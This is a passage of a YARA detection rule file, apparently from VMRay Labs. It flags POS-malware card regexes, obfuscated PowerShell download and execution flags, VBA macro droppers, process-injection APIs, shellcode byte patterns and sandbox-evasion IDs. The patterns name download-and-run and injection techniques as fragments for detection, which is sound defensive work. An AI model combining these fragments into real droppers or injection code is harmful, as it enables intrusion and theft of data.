----- Running Process ----- </H3>\" fullword ascii\n        $s2 = \"<H2>Operating system: %s<H2>\" fullword ascii\n        $s3 = \"<H2>System32 dir:  %s</H2>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them)\n}\n\nrule APLib_Compressed_PE {\n    meta:\n        description = \"PE file compressed by APLib\"\n        vti_default_score = 2\n        vti_documents_score = 4\n        vti_scripts_score = 2\n        vti_browser_score = 4\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n       \n        $ = {\n            4D 38 5A 90 38 03 66 02 04 09 71 FF 81 B8 C2 91\n            01 40 C2 15 C6 F8 09 1C 0E 1F BA F8 00 B4 09 CD\n            21 B8 01 4C C0 0A 54 68 69 73 20 0E 70 72 6F 67\n            67 61 6D 87 63 47 6E 1F 4F 74 E7 62 65 AF CF 75\n            5F 98 69 06 44 4F 7E 53 03 6D 6F 64 65\n            }\n    condition:\n        any of them\n}\n\nrule PosRegex\n{   \n    meta:\n        description = \"Usage of regex used by POS malware\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $s_alina1 = \"1[0-2])[0-9]\"\n        $s_alina2 = \"([0-9]{13,19}=(1[2-9])(0[1-9]|1[0-2])[0-9]{3,50}\\\\?)\"\n        $s_alina3 = \"((%?[Bb]?)[0-9]{13,19}\\\\^[A-Za-z\\\\s]{0,26}/[A-Za-z\\\\s]{0,26}\\\\^(1[2-9])(0[1-9]|1[0-2])[0-9\\\\s]{3,50}\\\\?)\"\n        $s_alina4 = \"((%?[Bb\u00b4`]?)[0-9]{13,19}\\\\^[A-Za-z\\\\s]{0,26}/[A-Za-z\\\\s]{0,26}\\\\^(1[2-9])(0[1-9]|1[0-2])[0-9\\\\s]{3,50}\\\\?)\"\n        $s_decebal1 = \"\\\\d{13,19}-\\\\d{7}\\\\w*\\\\?\"\n        $s_decebal2 = \"\\\\d{13,19}=\\\\d{7}\\\\w*\\\\?\"\n        $s_rdasrv1 = \"((b|B)[0-9]{13,19}\\\\^[A-Za-z\\\\s]{0,30}\\\\/[A-Za-z\\\\s]{0,30}\\\\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9\\\\s]{3,50}[0-9]{1})\"\n        $s_rdasrv2 = \"([0-9]{15,16}[D=](0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})\"\n        $s_vskimmer1 = \"[3-9]{1}[0-9]{12,19}[D=\\\\u0061][0-9]{10,30}\"\n        $s_generic1 = \"(([0-9]{13,19}=)|([a-zA-Z\\\\s]{3}\\\\^))(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))\"\n        $s_generic3 = \"((b|B)(([0-9]{13,16})|([0-9]|\\\\s){13,25})\\\\^[A-Za-z\\\\s0-9]{0,30}\\\\/[A-Za-z\\\\s0-9]{0,30}\\\\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))([0-9]|\\\\s){3,50})\"\n        $s_generic4 = \"([0-9]{15,16}(D|=)(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})\"\n\n    condition:\n        any of ($s*)\n}\n\nprivate rule _Powershell\n{\n    meta:\n        description = \"Rule used to restrict evaluation of powershell analysis rules\"\n        author = \"VMRay Labs\"\n\n    condition:\n        filesize < 1MB and\n        (mime_type == \"application/x-vba-macros\" or mime_type == \"text/javascript\" or mime_type == \"text/plain\")\n}\n\nrule PowerShell_Download_Commands\n{\n    meta:\n        description = \"PowerShell may attempt to download external content; possible dropper\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $cmdlet1 = \"Invoke-WebRequest\" fullword nocase\n        $cmdlet2 = \"Start-BitsTransfer\" fullword nocase\n\n        $arg1 = \"-Uri\" fullword nocase\n        $arg2 = \"-OutFile\" fullword nocase\n        $arg3 = \"-Source\" fullword nocase\n        $arg4 = \"-Destination\" fullword nocase\n\n        $webclient_cmd1 = \"Net.WebClient\" fullword nocase\n        $webclient_cmd2 = \"New-Object\" fullword nocase\n        $webclient_method1 = \"DownloadFile\" fullword nocase\n        $webclient_method2 = \"DownloadString\" fullword nocase\n\n    condition:\n        _Powershell and ((any of ($cmdlet*) and any of ($arg*)) or (all of ($webclient_cmd*) and any of ($webclient_method*)))\n}\n\nrule PowerShell_Execution_Commands\n{\n    meta:\n        description = \"PowerShell command execution detected\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ps1 = \"PowerShell\" fullword nocase\n        $ps2 = \"powershell.exe\" fullword nocase\n\n        $ep1 = \"-ep bypass\" fullword nocase\n        $ep2 = \"-exec bypass\" fullword nocase\n        $ep3 = \"-executionpolicy bypass\" fullword nocase\n        $ep4 = \"-noprofile\" fullword nocase\n        $ep5 = \"-nop\" fullword nocase\n\n        $win1 = \"-win hidden\" fullword nocase\n        $win2 = \"-windowsstyle hidden\" fullword nocase\n        $win3 = \"-w hidden\" fullword nocase\n\n        $command = \"-Command\" fullword nocase\n        $command_enc1 = \"-enc\" fullword nocase\n        $command_enc2 = \"-encodedcommand\" fullword nocase\n        $command_file1 = \"-File\" fullword nocase\n        $command_file2 = \"-PSConsoleFile\" fullword nocase\n        $command_inv1 = \"Invoke-Command\" fullword nocase\n        $command_inv2 = \"-scriptblock\" fullword nocase\n        $command_exp1 = \"Invoke-Expression -command\" fullword nocase\n        $command_exp2 = \"Invoke-Expression $\" nocase\n        $command_sh1 = \"Shell.Application\" fullword nocase\n        $command_sh2 = \"Start-Process\" fullword nocase\n\n    condition:\n        _Powershell\n        and (\n            1 of ($ps*) and any of ($ep*) and any of ($win*) and any of ($command*)\n        )\n}\n\nrule PowerShell_Registry_Commands\n{\n    meta:\n        description = \"PowerShell may attempt to read/write system registry\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $cmdlet1 = \"Get-Item\" fullword nocase\n        $cmdlet2 = \"Get-ItemProperty\" fullword nocase\n        $cmdlet3 = \"New-Item\" fullword nocase\n        $cmdlet4 = \"New-ItemProperty\" fullword nocase\n        $cmdlet5 = \"Rename-Item\" fullword nocase\n        $cmdlet6 = \"Rename-ItemProperty\" fullword nocase\n        $cmdlet7 = \"Remove-Item\" fullword nocase\n        $cmdlet8 = \"Remove-ItemProperty\" fullword nocase\n        $cmdlet9 = \"Set-Item\" fullword nocase\n        $cmdlet10 = \"Set-ItemProperty\" fullword nocase\n\n        $com1 = \"WScript.Shell\" fullword nocase\n        $com2 = \"RegDelete\" fullword nocase\n        $com3 = \"RegRead\" fullword nocase\n        $com4 = \"RegWrite\" fullword nocase\n\n        $path1 = \"HKLM\" fullword nocase\n        $path2 = \"HKCU\" fullword nocase\n        $path3 = \"Registry::HKEY_CURRENT_USER\" fullword nocase\n        $path4 = \"Registry::HKEY_LOCAL_MACHINE\" fullword nocase\n\n    condition:\n        _Powershell\n        and (\n            (any of ($cmdlet*) and any of ($path*))\n            or (2 of ($com*) and not mime_type == \"application/x-vba-macros\")\n        )\n}\n\nrule PowerShell_Case_Anomaly\n{\n    meta:\n        description = \"Obfuscated PowerShell hacktools\"\n        ref = \"https://twitter.com/danielhbohannon/status/905096106924761088\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"PowerShell_Case_Anomaly\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"powershell\" fullword nocase ascii wide\n        $sr1 = /(powershell|Powershell|PowerShell|POWERSHELL|powerShell)/ fullword ascii wide\n        $sn1 = \"powershell\" fullword ascii wide\n        $sn2 = \"Powershell\" fullword ascii wide\n        $sn3 = \"PowerShell\" fullword ascii wide\n        $sn4 = \"POWERSHELL\" fullword ascii wide\n        $sn5 = \"powerShell\" fullword ascii wide\n        $a1 = \"wershell -e \" nocase wide ascii\n        $an1 = \"wershell -e \" wide ascii\n        $an2 = \"werShell -e \" wide ascii\n        $k1 = \"-noprofile\" fullword nocase ascii wide\n        $kn1 = \"-noprofile\" ascii wide\n        $kn2 = \"-NoProfile\" ascii wide\n        $kn3 = \"-noProfile\" ascii wide\n        $kn4 = \"-NOPROFILE\" ascii wide\n        $kn5 = \"-Noprofile\" ascii wide\n\n    condition:\n        _Powershell and ((#s1 < 3 and #sr1 > 0 and #s1 > #sr1) or ($s1 and not 1 of ($sn*)) or ($a1 and not 1 of ($an*)) or ($k1 and not 1 of ($kn*)))\n}\n\nrule PowerShell_Invoke_PSImage\n{\n    meta:\n        description = \"Command to execute PowerShell from string\"\n        ref = \"https://github.com/peewpw/Invoke-PSImage\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Invoke_PSImage\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $ = \"IEX([System.Text.Encoding]::ASCII.GetString(\" ascii wide\n        $ = \"System.Drawing.Bitmap((a Net.WebClient).OpenRead(\" ascii wide\n        $ = { 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52\n            00 00 04 E4 00 00 03 A0 08 06 00 00 00 9D AF A9\n            E8 00 00 00 09 70 48 59 73 00 00 19 D6 00 00 19\n            D6 01 18 D1 CA ED 00 00 00 07 74 49 4D 45 07 E1\n            0C 0F 13 1E 36 89 C4 28 BF 00 00 00 07 74 45 58\n            74 41 75 74 68 6F 72 00 A9 AE CC 48 00 00 00 0C\n            74 45 58 74 44 65 73 63 72 69 70 74 69 6F 6E 00\n            13 09 21 23 00 00 00 0A 74 45 58 74 43 6F 70 79\n            72 69 67 68 74 00 AC 0F CC 3A 00 00 00 0E 74 45\n            58 74 43 72 65 61 74 69 6F 6E 20 74 69 6D 65 00\n            35 F7 0F }\n\n    condition:\n        _Powershell and 1 of them\n}\n\nrule SandboxProductID\n{\n    meta:\n        description = \"Sandbox detection via leaked Windows product IDs\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = \"76487-640-1457236-23837\" wide ascii\n        $ = \"76487-337-8429955-22614\" wide ascii\n        $ = \"76487-644-3177037-23510\" wide ascii\n        $ = \"76497-640-6308873-23835\" wide ascii\n        $ = \"55274-640-2673064-23950\" wide ascii\n        $ = \"76487-640-8834005-23195\" wide ascii\n        $ = \"76487-640-0716662-23535\" wide ascii\n        $ = \"76487-644-8648466-23106\" wide ascii\n        $ = \"00426-293-8170032-85146\" wide ascii\n        $ = \"76487-341-5883812-22420\" wide ascii\n        $ = \"76487-OEM-0027453-63796\" wide ascii\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or mime_type == \"text/plain\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and any of them\n}\n\nrule Shellcode_Find_kernel32_PEB\n{\n    meta:\n        description = \"x86 code to find kernel32.dll using the PEB; possible shellcode\"\n        ref = \"https://resources.infosecinstitute.com/pattern-based-approach-memory-shellcodes-detection/\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        // using InInitializationOrder list\n        $s1 = {\n            64 (a1 | 8b ??) 30 00 00 00  // mov <reg>, fs:[0x30]\n            8b ?? 0c                     // mov <reg>, [<reg>+0xc]\n            8b ?? 1c                     // mov <reg>, [<reg>+0x1c]\n            [1-2]                        // mov <reg>, [<reg>] / lods\n            8b ?? 08                     // mov <reg>, [<reg>+0x8]\n        }\n        // using InMemoryOrder list\n        $s2 = {\n            64 (a1 | 8b ??) 30 00 00 00  // mov <reg>, fs:[0x30]\n            8b ?? 0c                     // mov <reg>, [<reg>+0xc]\n            8b ?? 14                     // mov <reg>, [<reg>+0x14]\n            [1-2]                        // mov <reg>, [<reg>] / lods\n            [1-2]                        // mov <reg>, [<reg>] / lods\n            8b ?? 10                     // mov <reg>, [<reg>+0x10]\n        }\n\n    condition:\n        mime_type != \"application/x-dosexec\" and any of them\n}\n\nrule Shellcode_Find_kernel32_SEH\n{\n    meta:\n        description = \"x86 code to find kernel32.dll using SEH; possible shellcode\"\n        ref = \"https://resources.infosecinstitute.com/pattern-based-approach-memory-shellcodes-detection/\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = {\n            8B ?? 04        // mov <reg>, [<reg>+0x4]\n            4?              // dec <reg>\n            66 31 ??        // xor <reg>, <reg>\n            66 81 3? 4D 5A  // cmp WORD PTR [<reg>], 0x5a4d\n        }\n\n    condition:\n        mime_type != \"application/x-dosexec\" and $s1\n}\n\nrule Shellcode_Find_kernel32_TEB\n{\n    meta:\n        description = \"x86 code to find kernel32.dll using the TEB; possible shellcode\"\n        ref = \"https://resources.infosecinstitute.com/pattern-based-approach-memory-shellcodes-detection/\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = {\n            8b ?? e4        // mov <reg>, [reg-0x1c]\n            4?              // dec <reg>\n            66 31 ??        // xor <reg>, <reg>\n            66 81 3? 4D 5A  // cmp WORD PTR [<reg>], 0x5a4d\n        }\n\n    condition:\n        mime_type != \"application/x-dosexec\" and any of them\n}\n\nrule Shellcode_GetPC_fstenv\n{\n    meta:\n        description = \"x86 GetPC code using fstenv; possible shellcode\"\n        ref = \"https://resources.infosecinstitute.com/pattern-based-approach-memory-shellcodes-detection/\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s = {\n            d9 74 24 f4                // fnstenv [esp-0xc]\n            (58|59|5a|5b|5c|5d|5e|5f)  // pop <reg>\n        }\n\n    condition:\n        mime_type != \"application/x-dosexec\" and $s\n}\n\nrule Shellcode_API_hashing\n{\n    meta:\n        description = \"x86 API hashing code often found in shellcode\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2012/11/precalculated-string-hashes-reverse-engineering-shellcode.html\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"Didier Stevens (https://DidierStevens.com)\"\n        source = \"https://github.com/DidierStevens/DidierStevensSuite\"\n        original_name = \"maldoc_API_hashing\"\n        license = \"public domain\"\n\n    strings:\n        $s = {\n            ac        // lods al, BYTE PTR [esi]\n            84 C0     // test al, al\n            74 07     // je <end>\n            C1 CF ??  // ror edi, <shift>\n            01 C7     // add edi, eax\n            EB F4     // jmp <loop>\n        }\n\n    condition:\n        mime_type != \"application/x-dosexec\" and $s\n}\n\nrule Shellcode_NOP_sled_percent_enc {\n    meta:\n        description = \"Percent-encoded NOP sled; possible shellcode\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"%90%90%90%90%90%90%90%90\"\n        $s2 = \"%u9090%u9090%u9090%u9090\"\n\n    condition:\n        any of them\n}\n\nprivate rule _VBA_macro\n{\n    meta:\n        description = \"Rule used to restrict evaluation of macro content analysis rules\"\n        author = \"VMRay Labs\"\n\n    condition:\n        mime_type == \"application/x-vba-macros\"\n}\n\nrule VBA_Obfuscation_ObjectName\n{\n    meta:\n        description = \"VBA initializes COM object from long variable name; possible obfuscation\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = /\\bCreateObject\\s*\\(\\s*[a-z_]{12,}\\)/ nocase\n        $ = /\\bCreateObject\\s*\\(\\s*\\\"[\\w\\.]+\\\"\\s*[&+,]\\s*\\w+\\s*[&+,]\\s*\\\"[\\w\\.]+\\\"\\s*\\)/ nocase\n        $ = /\\bCreateObject\\s*\\(\\s*\\w{10,}([\\s+&]*[a-z]+)*\\)/ nocase\n        $ = /\\bCreateObject\\s*\\(\\s*\\w+\\((\\\"?[\\S ]+\\\"?([,+&]\\s*)?)\\)\\)/ nocase\n\n    condition:\n        _VBA_macro and any of them\n}\n\nrule VBA_Create_File\n{\n    meta:\n        description = \"VBA macro contains file creation commands; possible dropper\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $ado = /\\bCreateObject\\s*\\(\\s*(\\\"ADODB\\.Stream\\\")\\s*\\)/ nocase\n        $ado_methods = /\\b\\w+\\.(CopyTo|SaveToFile|Write(Line|Text)?)\\s*[\\w\\.\\\"\\\\\\-\\/:,+~!@#$&%?()<>= ]+\\W/ nocase\n\n        $fso = /\\bCreateObject\\s*\\(\\s*(\\\"Scripting\\.FileSystemObject\\\")\\s*\\)/ nocase\n        $fso_methods = /\\b\\w+\\.(CreateTextFile|Write(Line|Text)?)\\s*[\\w\\.\\\"\\\\\\-\\/:,+~!@#$&%?()<>= ]+\\W/ nocase\n\n        $api = /\\bCreateFile(A|W)?\\s*\\(?\\\"?\\w+\\\"?(,\\s*[\\\"\\w&]+){6}\\)/ nocase\n\n        $bin1 = /\\bOpen\\s+\\w+\\s+For\\s+Binary\\s+(Access\\s+\\w+\\s+)?As\\s+#\\d{1,3}/ nocase\n        $bin2 = /\\bPut\\s+#\\d{1,3},\\s*\\d+,\\s*\\w+/\n\n    condition:\n        _VBA_macro\n        and (\n            ($ado and $ado_methods)\n            or ($fso and $fso_methods)\n            or any of ($api*)\n            or 2 of ($bin*)\n            or (VBA_Obfuscation_ObjectName and ($ado_methods or $fso_methods))\n        )\n}\n\nrule VBA_Download_Commands\n{\n    meta:\n        description = \"VBA macro may attempt to download external content; possible dropper\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $msxml = /\\bCreateObject\\s*\\(\\s*(\\\"Microsoft\\.XMLHTTP\\\"|\\\"MSXML2\\.XMLHTTP\\\"|\\\"MSXML2\\.ServerXMLHTTP\\.\\d\\.\\d\\\"|\\\"WinHttp\\.WinHttpRequest\\.\\d.\\d\\\")\\s*\\)/ nocase\n        $msxml_methods = /\\b\\w+\\.(Open|Send|SetRequestHeader)\\s*[\\w\\.\\\"\\\\\\-\\/:,+~!@#$&%?()<>= ]+\\W/ nocase\n\n        $api1 = \"URLDownloadToFileA\" fullword nocase\n\n    condition:\n        _VBA_macro\n        and (\n            ($msxml and $msxml_methods)\n            or any of ($api*)\n            or (VBA_Obfuscation_ObjectName and $msxml_methods)\n        )\n}\n\nrule VBA_Execution_Commands\n{\n    meta:\n        description = \"VBA macro may execute files or system commands\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $wmi = /\\bGetObject\\(\\\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2:Win32_Process\\\"\\)/ nocase\n        $wmi_methods = /\\b\\w+\\.Create\\s*\\(?\\\"[^\\\"]+\\\"(,\\s*[\\\"\\w&]+){3} *[\\r\\n]/ nocase\n\n        $wsh = /\\b(WScript\\.)?CreateObject\\s*\\(\\s*(\\\"WScript\\.Shell\\\"|\\\"Shell\\.Application\\\")\\s*\\)/ nocase\n        $wsh_methods = /\\b\\w+\\.(AppActivate|Exec|Open|Run)\\b\\s*[\\w\\.\\\"\\\\\\-\\/:,+~!@#$&%?()<>= ]+\\W/ nocase\n\n        $api1 = /\\bCreateProcessA?\\b\\s*\\(?\\\"?[\\w&]+\\\"?(,\\s*[\\\"\\w&]+){9}\\)/\n        $api2 = /\\bShellExecuteA?\\b\\s*\\(?[\\\"\\w&]+(,\\s*[\\\"\\w&]+){5}\\)?/ nocase\n        $api3 = /\\bWinExec\\b\\s+\\(?[\\\\\\w\\\"\\. :~]+,\\s*\\d\\)?/ nocase\n\n        //$func1 = /\\bShell\\$?\\b\\s*\\(?\\s*[\\\"\\w][\\\\\\\"\\.\\w:~ ]+(,\\s*(\\d|[\\\"\\w]+))*\\)?/ nocase\n        $func1 = /\\bShell\\$?\\b\\s+\\(?\\\"[^\\\"]+\\\"(,\\s*[\\w\\-+ ]+)?\\)?/ nocase\n        $func2 = /\\bShell\\$?\\b\\s*\\(?\\w+(,\\s*[\\w\\-+ ]+)?\\)? *[\\r\\n]/ nocase\n        $func3 = /\\bShell\\$?\\b\\s*\\(?\\w+\\(\\\"[^\\)]+\\)(,\\s*[\\w\\-+ ]+)?\\)? *[\\r\\n]/ nocase\n        $func4 = /\\bExecute\\s+\\\"[^\\\"]+\\\"/ nocase\n\n    condition:\n        _VBA_macro\n        and (\n            ($wmi and $wmi_methods)\n            or ($wsh and $wsh_methods)\n            or any of ($api*)\n            or any of ($func*)\n            or (VBA_Obfuscation_ObjectName and $wsh_methods)\n        )\n}\n\nrule VBA_Obfuscation_Base64_PEFile\n{\n    meta:\n        description = \"VBA contains base64-encoded PE signature; possible dropper\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = \"TVqQAAMAAAAEAAAA//8AALgAAA\"\n        $ = \"TVqQAAIAAAAEAA8A//8AALgAAA\"\n        $ = \"TVqAAAEAAAAEABAAAAAAAAAAAA\"\n        $ = \"TVoAAAAAAAAAAAAAAAAAAAAAAA\"\n        $ = \"TVpTAQEAAAAEAAAA//8AALgAAAA\"\n\n    condition:\n        _VBA_macro and any of them\n}\n\nrule VBA_Obfuscation_Chain_Funcs\n{\n    meta:\n        description = \"VBA contains numerous functions which only call another function; possible obfuscation\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $func_only_calls = /\\b(Private|Public|Static)?\\s*(Function|Sub)\\s+\\w+\\(\\)(\\s*As\\s*\\w+)?(\\s*As\\s*\\w+)?(\\s+(Call\\s*)?\\w+(\\s*\\(?\\s*\\\"\\w+\\\"?\\)?){1,2})+\\s+End\\s+(Function|Sub)/ nocase\n\n    condition:\n        _VBA_macro\n        and #func_only_calls > 10\n}\n\nrule VBA_Obfuscation_Long_VarName\n{\n    meta:\n        description = \"VBA contains excessively long variable names; possible obfuscation\"\n        vti_default_score = 2\n        vti_documents_score = 2\n        vti_scripts_score = 2\n        vti_browser_score = 2\n        vti_msi_score = 2\n        vti_static_score = 2\n        author = \"VMRay Labs\"\n\n    strings:\n        $var1 = /Const [a-z]{30,}/ fullword nocase\n        $var2 = /Dim [a-z]{30,}/ fullword nocase\n        $var3 = /Set [a-z]{30,}/ fullword nocase\n\n    condition:\n        _VBA_macro and for any of ($var*) : ( # > 5 )\n}\n\nrule VBA_Process_Injection\n{\n    meta:\n        description = \"VBA macro may attempt to inject code into another process\"\n        vti_default_score = 4\n        vti_documents_score = 4\n        vti_scripts_score = 4\n        vti_browser_score = 4\n        vti_msi_score = 4\n        vti_static_score = 4\n        author = \"VMRay Labs\"\n\n    strings:\n        $ = \"CreateRemoteThread\" fullword nocase\n        $ = \"CreateThread\" fullword nocase\n        $ = \"CreateToolhelp32Snapshot\" fullword nocase\n        $ = \"LoadLibraryA\" fullword nocase\n        $ = \"NtCreateThreadEx\" fullword nocase\n        $ = \"NtUnmapViewOfSection\" fullword nocase\n        $ = \"OpenProcess\" fullword nocase\n        $ = \"QueueUserAPC\" fullword nocase\n        $ = \"RtlCreateUserThread\" fullword nocase\n        $ = \"RtlMoveMemory\" fullword nocase\n        $ = \"SetThreadContext\" fullword nocase\n        $ = \"SuspendThread\" fullword nocase\n        $ = \"VirtualAlloc\" fullword nocase\n        $ = \"VirtualAllocEx\" fullword nocase\n        $ = \"VirtualProtect\" fullword nocase\n        $ = \"WriteProcessMemory\" fullword nocase\n        $ = \"ZwUnmapViewOfSection\" fullword nocase\n\n    condition:\n        _VBA_macro and 3 of them\n}\n\nrule VBA_Registry_Commands\n{\n    meta:\n        description = \"VBA macro may attempt to read/write system registry\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $wsh = /\\b(WScript\\.)?CreateObject\\s*\\(\\s*(\\\"WScript\\.Shell\\\")\\s*\\)/ nocase\n        $wsh_methods = /\\b\\w+\\.(RegRead|RegWrite)\\s*[\\w\\.\\\"\\\\\\-\\/:,+~!@#$&%?()<>= ]+\\W/ nocase\n\n        $dll = \"ADVAPI32.DLL\" fullword nocase\n        $api1 = \"RegCloseKey\" fullword nocase\n        $api2 = \"RegCreateKey\" fullword nocase\n        $api3 = \"RegOpenKeyEx\" fullword nocase\n        $api4 = \"RegSetValueEx\" fullword nocase\n        $api5 = \"RegQueryValueEx\" fullword nocase\n\n    condition:\n        _VBA_macro\n        and (\n            ($wsh and for any of ($wsh_methods*) : ( @ > @wsh ))\n            or ($dll and 2 of ($api*))\n            or (VBA_Obfuscation_ObjectName and $wsh_methods)\n        )\n}\n\nrule VBA_Time_Delay_Loops\n{\n    meta:\n        description = \"VBA macro utilizes time delay loops; possible impact upon dynamic analysis\"\n        vti_default_score = 1\n        vti_documents_score = 1\n        vti_scripts_score = 1\n        vti_browser_score = 1\n        vti_msi_score = 1\n        vti_static_score = 1\n        author = \"VMRay Labs\"\n\n    strings:\n        $do_until = /\\bDo Until\\s+\\((Now|Time)(\\(\\))?\\s*>=?\\s*\\w+\\)/ nocase\n        $loop_until = /\\bDo\\s+(\\S+)?\\s*DoEvents\\s+(\\S+)?\\s*Loop Until\\s+\\w+\\s*>?=\\s*\\w+/ nocase\n\n    condition:\n        _VBA_macro\n        and (\n            any of them\n        )\n}\n\nrule VBA_Time_Delay_with_HighVal\n{\n    meta:\n        description = \"VBA macro utilizes long time delay functions; possible analysis counter-measure\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $sleep_func = /[^.']Sleep\\s*\\(?\\s*\\d{5,}(\\s*\\))?/ nocase\n        $sleep_method = /\\b(System\\.Threading\\.Thread\\.|wscript\\.)Sleep\\s*(\\(\\s*)?\\d{5,}\\)?/ nocase\n\n        $wait_dateadd = /\\bApplication\\.Wait\\s+DateAdd\\s*\\(\\s*(\\\"s\\\",\\s*\\d{2,}|\\\"[hm]\\\",\\s*\\d),\\s*Now\\s*(\\(\\))?\\s*\\)/ nocase\n        $wait_timeserial_h = /\\bApplication\\.Wait\\s+(\\(\\s*)?(Time\\s*\\+\\s*)?TimeSerial\\(\\s*Hour\\(Now(\\(\\))?\\)\\s*\\+\\s*\\d+,\\s*Minute\\(Now(\\(\\))?\\),\\s*Second\\(Now(\\(\\))?\\)\\)/ nocase\n        $wait_timeserial_m = /\\bApplication\\.Wait\\s+(\\(\\s*)?(Time\\s*\\+\\s*)?TimeSerial\\(\\s*Hour\\(Now(\\(\\))?\\),\\s*Minute\\(Now(\\(\\))?\\)\\s*\\+\\s*\\d+,\\s*Second\\(Now(\\(\\))?\\)\\)/ nocase\n        $wait_timeserial_s = /\\bApplication\\.Wait\\s+(\\(\\s*)?(Time\\s*\\+\\s*)?TimeSerial\\(\\s*Hour\\(Now(\\(\\))?\\),\\s*Minute\\(Now(\\(\\))?\\),\\s*Second\\(Now(\\(\\))?\\)\\s*\\+\\s*(0\\d{2,}|[1-9][0-9]+)\\s*\\)/ nocase\n        $wait_timestr = /\\bApplication.Wait\\s+(\\(\\s*)?\\\"(([1-9]|0[1-9]|[1-9][0-9]):\\d{2}:\\d{1,2}|\\d{2}:(0[1-9]|[1-9][0-9]):\\d{1,2}|\\d{1,2}:\\d{2}:[1-9][0-9])\\\"\\)?/ nocase\n        $wait_timeval = 